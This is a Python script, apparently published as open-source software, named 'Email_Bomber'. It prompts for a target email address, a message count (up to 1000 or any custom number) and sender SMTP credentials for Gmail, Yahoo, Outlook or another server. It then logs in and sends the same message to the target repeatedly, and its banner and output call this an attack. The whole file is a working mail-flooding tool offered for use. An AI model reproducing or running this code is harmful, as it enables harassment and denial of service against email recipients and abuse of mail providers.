#!/usr/bin/python3
#
#  [Program]
#
#  EM
#  Email_Bomber
#
#
#  [Author]
#  HorridHanu
#
#
#
#  [License]
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#
#  See 'LICENSE' for more information.
'''imports'''
import smtplib
import sys


class hcolors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'


def banner():
    print(hcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(hcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(hcolors.GREEN + '''


        ______                _ __            ____                  __             
       / ____/___ ___  ____ _(_) /           / __ )____  ____ ___  / /_  ___  _____
      / __/ / __ `__ \/ __ `/ / /  ______   / __  / __ \/ __ `__ \/ __ \/ _ \/ ___/
     / /___/ / / / / / /_/ / / /  /_____/  / /_/ / /_/ / / / / / / /_/ /  __/ /    
    /_____/_/ /_/ /_/\__,_/_/_/           /_____/\____/_/ /_/ /_/_.___/\___/_/     


    					     [ AUTHOR : HORRID HANU ]


                                                                  ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(hcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(hcolors.GREEN + 'Enter target email <: '))
            self.mode = int(
                input(hcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(hcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(hcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(hcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(hcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(
                input(hcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(hcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(hcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(hcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(hcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(hcolors.GREEN + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(hcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(hcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(hcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()